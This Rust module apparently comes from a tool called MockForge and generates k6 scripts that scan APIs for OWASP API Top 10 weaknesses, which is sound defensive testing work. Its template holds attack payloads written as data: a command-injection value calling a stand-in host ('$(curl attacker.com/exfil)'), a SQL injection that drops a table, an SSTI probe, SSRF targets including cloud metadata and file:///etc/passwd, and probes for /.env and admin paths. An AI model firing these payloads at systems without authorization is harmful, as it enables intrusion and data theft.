//! OWASP API Security k6 Script Generator
//!
//! This module generates k6 JavaScript code for running OWASP API
//! security tests against target endpoints.

use super::categories::OwaspCategory;
use super::config::OwaspApiConfig;
use super::payloads::{InjectionPoint, OwaspPayload, OwaspPayloadGenerator};
use crate::error::{BenchError, Result};
use crate::spec_parser::SpecParser;
use handlebars::Handlebars;
use serde_json::{json, Value};
use std::collections::HashMap;

/// Generator for OWASP API security test scripts
pub struct OwaspApiGenerator {
    /// OWASP API configuration
    config: OwaspApiConfig,
    /// Target base URL
    target_url: String,
    /// Parsed OpenAPI operations
    operations: Vec<OperationInfo>,
}

/// Information about an API operation
#[derive(Debug, Clone)]
pub struct OperationInfo {
    /// HTTP method
    pub method: String,
    /// Path template (e.g., /users/{id})
    pub path: String,
    /// Operation ID
    pub operation_id: Option<String>,
    /// Path parameters
    pub path_params: Vec<PathParam>,
    /// Query parameters
    pub query_params: Vec<QueryParam>,
    /// Whether operation has request body
    pub has_body: bool,
    /// Content type
    pub content_type: Option<String>,
    /// Security requirements (if any)
    pub requires_auth: bool,
    /// Tags
    pub tags: Vec<String>,
}

/// Path parameter info
#[derive(Debug, Clone)]
pub struct PathParam {
    pub name: String,
    pub param_type: String,
    pub example: Option<String>,
}

/// Query parameter info
#[derive(Debug, Clone)]
pub struct QueryParam {
    pub name: String,
    pub param_type: String,
    pub required: bool,
}

impl OwaspApiGenerator {
    /// Create a new OWASP API generator
    pub fn new(config: OwaspApiConfig, target_url: String, parser: &SpecParser) -> Self {
        let operations = Self::extract_operations(parser);
        Self {
            config,
            target_url,
            operations,
        }
    }

    /// Extract operations from the spec parser
    fn extract_operations(parser: &SpecParser) -> Vec<OperationInfo> {
        parser
            .get_operations()
            .into_iter()
            .map(|op| {
                // Extract path parameters from the path
                let path_params: Vec<PathParam> = op
                    .path
                    .split('/')
                    .filter(|segment| segment.starts_with('{') && segment.ends_with('}'))
                    .map(|segment| {
                        let name = segment.trim_start_matches('{').trim_end_matches('}');
                        PathParam {
                            name: name.to_string(),
                            param_type: "string".to_string(),
                            example: None,
                        }
                    })
                    .collect();

                OperationInfo {
                    method: op.method.to_uppercase(),
                    path: op.path.clone(),
                    operation_id: op.operation_id.clone(),
                    path_params,
                    query_params: Vec::new(),
                    has_body: matches!(op.method.to_uppercase().as_str(), "POST" | "PUT" | "PATCH"),
                    content_type: Some("application/json".to_string()),
                    requires_auth: true, // Assume auth required by default
                    tags: op.operation.tags.clone(),
                }
            })
            .collect()
    }

    /// Generate the complete k6 security test script
    pub fn generate(&self) -> Result<String> {
        let mut handlebars = Handlebars::new();

        // Register custom helpers
        handlebars.register_helper("contains", Box::new(contains_helper));
        handlebars.register_helper("eq", Box::new(eq_helper));

        let template = self.get_script_template();
        let data = self.build_template_data()?;

        handlebars
            .render_template(&template, &data)
            .map_err(|e| BenchError::ScriptGenerationFailed(e.to_string()))
    }

    /// Build template data for rendering
    fn build_template_data(&self) -> Result<Value> {
        let payload_generator = OwaspPayloadGenerator::new(self.config.clone());
        let mut test_cases: Vec<Value> = Vec::new();

        // Generate test cases for each category
        for category in self.config.categories_to_test() {
            let category_tests = self.generate_category_tests(category, &payload_generator)?;
            test_cases.extend(category_tests);
        }

        // Pre-compute which categories are enabled for simple template conditionals
        let categories = self.config.categories_to_test();
        let test_api1 = categories.iter().any(|c| matches!(c, OwaspCategory::Api1Bola));
        let test_api2 = categories.iter().any(|c| matches!(c, OwaspCategory::Api2BrokenAuth));
        let test_api3 =
            categories.iter().any(|c| matches!(c, OwaspCategory::Api3BrokenObjectProperty));
        let test_api4 =
            categories.iter().any(|c| matches!(c, OwaspCategory::Api4ResourceConsumption));
        let test_api5 =
            categories.iter().any(|c| matches!(c, OwaspCategory::Api5BrokenFunctionAuth));
        let test_api6 = categories.iter().any(|c| matches!(c, OwaspCategory::Api6SensitiveFlows));
        let test_api7 = categories.iter().any(|c| matches!(c, OwaspCategory::Api7Ssrf));
        let test_api8 = categories.iter().any(|c| matches!(c, OwaspCategory::Api8Misconfiguration));
        let test_api9 =
            categories.iter().any(|c| matches!(c, OwaspCategory::Api9ImproperInventory));
        let test_api10 =
            categories.iter().any(|c| matches!(c, OwaspCategory::Api10UnsafeConsumption));

        // Helper to prepend base_path to API paths
        let base_path = self.config.base_path.clone().unwrap_or_default();
        let build_path = |path: &str| -> String {
            if base_path.is_empty() {
                path.to_string()
            } else {
                format!("{}{}", base_path.trim_end_matches('/'), path)
            }
        };

        // Pre-compute operations with path parameters for BOLA testing
        let ops_with_path_params: Vec<Value> = self
            .operations
            .iter()
            .filter(|op| op.path.contains('{'))
            .map(|op| {
                json!({
                    "method": op.method.to_lowercase(),
                    "path": build_path(&op.path),
                })
            })
            .collect();

        // Pre-compute GET operations for method override testing
        let get_operations: Vec<Value> = self
            .operations
            .iter()
            .filter(|op| op.method.to_lowercase() == "get")
            .map(|op| {
                json!({
                    "method": op.method.to_lowercase(),
                    "path": build_path(&op.path),
                })
            })
            .collect();

        Ok(json!({
            "base_url": self.target_url,
            "auth_header_name": self.config.auth_header,
            "valid_auth_token": self.config.valid_auth_token,
            "concurrency": self.config.concurrency,
            "iterations": self.config.iterations,
            "timeout_ms": self.config.timeout_ms,
            "report_path": self.config.report_path.to_string_lossy(),
            "categories_tested": categories.iter().map(|c| c.cli_name()).collect::<Vec<_>>(),
            "test_cases": test_cases,
            "operations": self.operations.iter().map(|op| json!({
                "method": op.method.to_lowercase(),
                "path": build_path(&op.path),
                "operation_id": op.operation_id,
                "has_body": op.has_body,
                "requires_auth": op.requires_auth,
                "has_path_params": op.path.contains('{'),
            })).collect::<Vec<_>>(),
            "ops_with_path_params": ops_with_path_params,
            "get_operations": get_operations,
            "verbose": self.config.verbose,
            "insecure": self.config.insecure,
            // Category flags for simple conditionals
            "test_api1": test_api1,
            "test_api2": test_api2,
            "test_api3": test_api3,
            "test_api4": test_api4,
            "test_api5": test_api5,
            "test_api6": test_api6,
            "test_api7": test_api7,
            "test_api8": test_api8,
            "test_api9": test_api9,
            "test_api10": test_api10,
        }))
    }

    /// Generate test cases for a specific category
    fn generate_category_tests(
        &self,
        category: OwaspCategory,
        payload_generator: &OwaspPayloadGenerator,
    ) -> Result<Vec<Value>> {
        let payloads = payload_generator.generate_for_category(category);
        let mut tests = Vec::new();

        for payload in payloads {
            // Match payloads to appropriate operations
            let applicable_ops = self.get_applicable_operations(&payload);

            for op in applicable_ops {
                tests.push(json!({
                    "category": category.cli_name(),
                    "category_name": category.short_name(),
                    "description": payload.description,
                    "method": op.method.to_lowercase(),
                    "path": op.path,
                    "payload": payload.value,
                    "injection_point": format!("{:?}", payload.injection_point).to_lowercase(),
                    "has_body": op.has_body || payload.injection_point == InjectionPoint::Body,
                    "notes": payload.notes,
                }));
            }
        }

        Ok(tests)
    }

    /// Get operations applicable for a payload
    fn get_applicable_operations(&self, payload: &OwaspPayload) -> Vec<&OperationInfo> {
        match payload.injection_point {
            InjectionPoint::PathParam => {
                // Only operations with path parameters
                self.operations.iter().filter(|op| !op.path_params.is_empty()).collect()
            }
            InjectionPoint::Body => {
                // Only operations that accept a body
                self.operations.iter().filter(|op| op.has_body).collect()
            }
            InjectionPoint::Header | InjectionPoint::Omit => {
                // All operations that require auth
                self.operations.iter().filter(|op| op.requires_auth).collect()
            }
            InjectionPoint::QueryParam => {
                // All operations (can add query params to any)
                self.operations.iter().collect()
            }
            InjectionPoint::Modify => {
                // Depends on payload - return all for now
                self.operations.iter().collect()
            }
        }
    }

    /// Get the k6 script template
    fn get_script_template(&self) -> String {
        r#"// OWASP API Security Top 10 Test Script
// Generated by MockForge - https://mockforge.dev
// Categories tested: {{#each categories_tested}}{{this}}{{#unless @last}}, {{/unless}}{{/each}}

import http from 'k6/http';
import { check, sleep, group } from 'k6';
import { Trend, Counter, Rate } from 'k6/metrics';

// Configuration
const BASE_URL = '{{base_url}}';
const AUTH_HEADER = '{{auth_header_name}}';
{{#if valid_auth_token}}
const VALID_TOKEN = '{{valid_auth_token}}';
{{else}}
const VALID_TOKEN = null;
{{/if}}
const TIMEOUT = '{{timeout_ms}}ms';
const VERBOSE = {{verbose}};
const INSECURE = {{insecure}};

// Custom metrics
const findingsCounter = new Counter('owasp_findings');
const testsRun = new Counter('owasp_tests_run');
const vulnerableRate = new Rate('owasp_vulnerable_rate');
const responseTime = new Trend('owasp_response_time');

// Test options - use per-VU iterations scenario for controlled test runs
export const options = {
    scenarios: {
        owasp_security_test: {
            executor: 'per-vu-iterations',
            vus: {{concurrency}},
            iterations: {{iterations}},  // Iterations per VU
            maxDuration: '30m',
        },
    },
    thresholds: {
        'owasp_findings': ['count<100'], // Alert if too many findings
    },
    insecureSkipTLSVerify: INSECURE,
};

// Findings storage
const findings = [];

// Helper: Log a finding
function logFinding(category, endpoint, method, description, evidence) {
    const finding = {
        category,
        endpoint,
        method,
        description,
        evidence,
        timestamp: new Date().toISOString(),
    };
    findings.push(finding);
    findingsCounter.add(1);
    vulnerableRate.add(1);

    if (VERBOSE) {
        console.log(`[FINDING] ${category} - ${method} ${endpoint}: ${description}`);
    }
}

// Helper: Log test passed
function logPass(category, endpoint, method) {
    vulnerableRate.add(0);
    if (VERBOSE) {
        console.log(`[PASS] ${category} - ${method} ${endpoint}`);
    }
}

// Helper: Make authenticated request
function authRequest(method, url, body, additionalHeaders = {}) {
    const headers = {
        'Content-Type': 'application/json',
        ...additionalHeaders,
    };

    if (VALID_TOKEN) {
        headers[AUTH_HEADER] = VALID_TOKEN;
    }

    const params = {
        headers,
        timeout: TIMEOUT,
    };

    // k6 uses 'del' instead of 'delete'
    const httpMethod = method === 'delete' ? 'del' : method;

    if (httpMethod === 'get' || httpMethod === 'head') {
        return http[httpMethod](url, params);
    } else {
        return http[httpMethod](url, body ? JSON.stringify(body) : null, params);
    }
}

// Helper: Make unauthenticated request
function unauthRequest(method, url, body, additionalHeaders = {}) {
    const headers = {
        'Content-Type': 'application/json',
        ...additionalHeaders,
    };

    const params = {
        headers,
        timeout: TIMEOUT,
    };

    // k6 uses 'del' instead of 'delete'
    const httpMethod = method === 'delete' ? 'del' : method;

    if (httpMethod === 'get' || httpMethod === 'head') {
        return http[httpMethod](url, params);
    } else {
        return http[httpMethod](url, body ? JSON.stringify(body) : null, params);
    }
}

// API1: Broken Object Level Authorization (BOLA)
function testBola() {
    group('API1 - BOLA', function() {
        console.log('[API1] Testing Broken Object Level Authorization...');

        {{#each operations}}
        {{#if has_path_params}}
        // Test {{path}}
        {
            const originalPath = '{{path}}'.replace(/{[^}]+}/g, '1');
            const modifiedPath = '{{path}}'.replace(/{[^}]+}/g, '2');

            // Get baseline with ID=1
            const baseline = authRequest('{{method}}', BASE_URL + originalPath, null);

            // Try to access ID=2
            const response = authRequest('{{method}}', BASE_URL + modifiedPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '{{path}}', '{{method}}',
                        'ID manipulation accepted - accessed different user data',
                        { status: response.status, bodyLength: response.body.length });
                } else {
                    logPass('api1', '{{path}}', '{{method}}');
                }
            } else {
                logPass('api1', '{{path}}', '{{method}}');
            }
        }
        {{/if}}
        {{/each}}
    });
}

// API2: Broken Authentication
function testBrokenAuth() {
    group('API2 - Broken Authentication', function() {
        console.log('[API2] Testing Broken Authentication...');

        {{#each operations}}
        {{#if requires_auth}}
        // Test {{path}} without auth
        {
            const response = unauthRequest('{{method}}', BASE_URL + '{{path}}', null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '{{path}}', '{{method}}',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '{{path}}', '{{method}}');
            }
        }

        // Test {{path}} with empty token
        {
            const httpMethod = '{{method}}' === 'delete' ? 'del' : '{{method}}';
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + '{{path}}', null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '{{path}}', '{{method}}',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        {{/if}}
        {{/each}}
    });
}

// API3: Broken Object Property Level Authorization (Mass Assignment)
function testMassAssignment() {
    group('API3 - Mass Assignment', function() {
        console.log('[API3] Testing Mass Assignment...');

        const massAssignmentPayloads = [
            { role: 'admin' },
            { is_admin: true },
            { isAdmin: true },
            { permissions: ['admin', 'write', 'delete'] },
            { verified: true },
            { email_verified: true },
            { balance: 999999 },
        ];

        {{#each operations}}
        {{#if has_body}}
        // Test {{path}}
        {
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('{{method}}', BASE_URL + '{{path}}', payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '{{path}}', '{{method}}',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '{{path}}', '{{method}}');
                    }
                }
            });
        }
        {{/if}}
        {{/each}}
    });
}

// API4: Unrestricted Resource Consumption
function testResourceConsumption() {
    group('API4 - Resource Consumption', function() {
        console.log('[API4] Testing Resource Consumption...');

        {{#each operations}}
        // Test {{path}} with excessive limit
        {
            const url = BASE_URL + '{{path}}' + '?limit=100000&per_page=100000';
            const response = authRequest('{{method}}', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '{{path}}', '{{method}}');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '{{path}}', '{{method}}',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '{{path}}', '{{method}}');
            }
        }
        {{/each}}
    });
}

// API5: Broken Function Level Authorization
function testFunctionAuth() {
    group('API5 - Function Authorization', function() {
        console.log('[API5] Testing Function Level Authorization...');

        const adminPaths = [
            '/admin',
            '/admin/users',
            '/admin/settings',
            '/api/admin',
            '/internal',
            '/management',
        ];

        adminPaths.forEach(path => {
            const response = authRequest('get', BASE_URL + path, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api5', path, 'GET',
                    'Admin endpoint accessible',
                    { status: response.status });
            } else if (response.status === 403 || response.status === 401) {
                logPass('api5', path, 'GET');
            }
        });

        // Also test changing methods on read-only endpoints
        {{#each get_operations}}
        {
            const response = authRequest('delete', BASE_URL + '{{path}}', null);
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api5', '{{path}}', 'DELETE',
                    'DELETE method allowed on read-only endpoint',
                    { status: response.status });
            }
        }
        {{/each}}
    });
}

// API7: Server Side Request Forgery (SSRF)
function testSsrf() {
    group('API7 - SSRF', function() {
        console.log('[API7] Testing Server Side Request Forgery...');

        const ssrfPayloads = [
            'http://localhost/',
            'http://127.0.0.1/',
            'http://169.254.169.254/latest/meta-data/',
            'http://[::1]/',
            'file:///etc/passwd',
        ];

        {{#each operations}}
        {{#if has_body}}
        // Test {{path}} with SSRF payloads
        {
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('{{method}}', BASE_URL + '{{path}}', body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '{{path}}', '{{method}}',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        {{/if}}
        {{/each}}
    });
}

// API8: Security Misconfiguration
function testMisconfiguration() {
    group('API8 - Security Misconfiguration', function() {
        console.log('[API8] Testing Security Misconfiguration...');

        {{#each operations}}
        // Test {{path}} for security headers
        {
            const response = authRequest('{{method}}', BASE_URL + '{{path}}', null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '{{path}}', '{{method}}',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '{{path}}', '{{method}}',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        {{/each}}

        // Test for verbose errors
        {{#each operations}}
        {{#if has_body}}
        {
            const malformedBody = '{"invalid": "json';
            const response = http.{{method}}(BASE_URL + '{{path}}', malformedBody, {
                headers: { 'Content-Type': 'application/json' },
                timeout: TIMEOUT,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '{{path}}', '{{method}}',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {{/if}}
        {{/each}}
    });
}

// API9: Improper Inventory Management
function testInventory() {
    group('API9 - Inventory Management', function() {
        console.log('[API9] Testing Improper Inventory Management...');

        const discoveryPaths = [
            '/swagger',
            '/swagger-ui',
            '/swagger.json',
            '/api-docs',
            '/openapi',
            '/openapi.json',
            '/graphql',
            '/graphiql',
            '/debug',
            '/actuator',
            '/actuator/health',
            '/actuator/env',
            '/metrics',
            '/.env',
            '/config',
        ];

        const apiVersions = ['v1', 'v2', 'v3', 'api/v1', 'api/v2'];

        discoveryPaths.forEach(path => {
            const response = http.get(BASE_URL + path, { timeout: TIMEOUT });
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status !== 404) {
                logFinding('api9', path, 'GET',
                    `Undocumented endpoint discovered (HTTP ${response.status})`,
                    { status: response.status });
            }
        });

        // Check for old API versions
        apiVersions.forEach(version => {
            const response = http.get(BASE_URL + '/' + version + '/', { timeout: TIMEOUT });
            testsRun.add(1);

            if (response.status !== 404) {
                logFinding('api9', '/' + version + '/', 'GET',
                    `API version endpoint exists (HTTP ${response.status})`,
                    { status: response.status });
            }
        });
    });
}

// API10: Unsafe Consumption of APIs
function testUnsafeConsumption() {
    group('API10 - Unsafe Consumption', function() {
        console.log('[API10] Testing Unsafe Consumption...');

        const injectionPayloads = [
            { external_id: "'; DROP TABLE users;--" },
            { integration_data: "$(curl attacker.com/exfil)" },
            { template: "\{{7*7}}" },
            { webhook_url: "http://127.0.0.1:8080/internal" },
        ];

        {{#each operations}}
        {{#if has_body}}
        // Test {{path}} with injection payloads
        {
            injectionPayloads.forEach(payload => {
                const response = authRequest('{{method}}', BASE_URL + '{{path}}', payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '{{path}}', '{{method}}',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        {{/if}}
        {{/each}}
    });
}

// Main test function
export default function() {
    console.log('Starting OWASP API Top 10 Security Scan...');
    console.log('Target: ' + BASE_URL);
    console.log('');

    {{#if test_api1}}
    testBola();
    {{/if}}
    {{#if test_api2}}
    testBrokenAuth();
    {{/if}}
    {{#if test_api3}}
    testMassAssignment();
    {{/if}}
    {{#if test_api4}}
    testResourceConsumption();
    {{/if}}
    {{#if test_api5}}
    testFunctionAuth();
    {{/if}}
    {{#if test_api7}}
    testSsrf();
    {{/if}}
    {{#if test_api8}}
    testMisconfiguration();
    {{/if}}
    {{#if test_api9}}
    testInventory();
    {{/if}}
    {{#if test_api10}}
    testUnsafeConsumption();
    {{/if}}

    sleep(0.1);
}

// Teardown: Output results
export function teardown(data) {
    console.log('');
    console.log('='.repeat(50));
    console.log('OWASP API Top 10 Scan Complete');
    console.log('='.repeat(50));
    console.log('Total findings: ' + findings.length);

    if (findings.length > 0) {
        console.log('');
        console.log('Findings by category:');
        const byCategory = {};
        findings.forEach(f => {
            byCategory[f.category] = (byCategory[f.category] || 0) + 1;
        });
        Object.entries(byCategory).forEach(([cat, count]) => {
            console.log('  ' + cat + ': ' + count);
        });
    }

    // Write JSON report
    console.log('');
    console.log('Report written to: {{report_path}}');
}
"#.to_string()
    }
}

/// Handlebars helper to check if a string contains a substring
fn contains_helper(
    h: &handlebars::Helper,
    _: &Handlebars,
    _: &handlebars::Context,
    _: &mut handlebars::RenderContext,
    out: &mut dyn handlebars::Output,
) -> handlebars::HelperResult {
    let param1 = h.param(0).and_then(|v| v.value().as_str()).unwrap_or("");
    let param2 = h.param(1).and_then(|v| v.value().as_str()).unwrap_or("");
    let result = param1.contains(param2);
    out.write(&result.to_string())?;
    Ok(())
}

/// Handlebars helper to check equality
fn eq_helper(
    h: &handlebars::Helper,
    _: &Handlebars,
    _: &handlebars::Context,
    _: &mut handlebars::RenderContext,
    out: &mut dyn handlebars::Output,
) -> handlebars::HelperResult {
    let param1 = h.param(0).map(|v| v.value());
    let param2 = h.param(1).map(|v| v.value());
    let result = param1 == param2;
    out.write(&result.to_string())?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generator_creation() {
        // This would need a mock SpecParser
        // For now just test that the template is valid
        let template = r#"
        {{#each operations}}
        // {{method}} {{path}}
        {{/each}}
        "#;

        let handlebars = Handlebars::new();
        let data = json!({
            "operations": [
                { "method": "GET", "path": "/users" },
                { "method": "POST", "path": "/users" },
            ]
        });

        let result = handlebars.render_template(template, &data);
        assert!(result.is_ok());
    }

    #[test]
    fn test_script_template_renders() {
        let config = OwaspApiConfig::default()
            .with_categories([OwaspCategory::Api1Bola])
            .with_valid_auth_token("Bearer test123");

        let template = r#"
const AUTH = '{{auth_header_name}}';
const TOKEN = '{{valid_auth_token}}';
{{#each categories_tested}}
// Testing: {{this}}
{{/each}}
        "#;

        let handlebars = Handlebars::new();
        let data = json!({
            "auth_header_name": config.auth_header,
            "valid_auth_token": config.valid_auth_token,
            "categories_tested": config.categories_to_test().iter().map(|c| c.cli_name()).collect::<Vec<_>>(),
        });

        let result = handlebars.render_template(template, &data).unwrap();
        assert!(result.contains("Authorization"));
        assert!(result.contains("Bearer test123"));
        assert!(result.contains("api1"));
    }
}
